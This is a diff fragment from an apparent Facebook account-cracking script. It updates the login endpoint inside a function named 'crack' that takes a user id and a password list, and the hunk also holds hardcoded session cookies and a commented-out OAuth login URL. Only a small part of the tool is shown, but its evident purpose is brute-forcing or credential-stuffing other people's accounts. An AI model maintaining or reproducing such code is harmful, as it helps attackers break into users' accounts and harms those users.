@@ -278,7 +278,7 @@ def crack(uid, password_list, total_count):
             'sb': '5DjTaWwgMKgUjL41K8q6jNjF',
             'fr': '10296q4XBTILTnpPu.AWfvSGyRaXPpU2MPGYaXH4MM9hm2uq3WDM2beQF5qeN-ny5d_tA.Bpyu2N..AAA.0.0.Bp0zkD.AWf9_N0drAMlpBpI4WYjnsLqTmA',}
             #u = rl"https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://m.facebook.com/async/wbloks/fetch/"
             headers = {
             'user-agent': us,
             'Accept-Encoding': 'gzip, deflate',
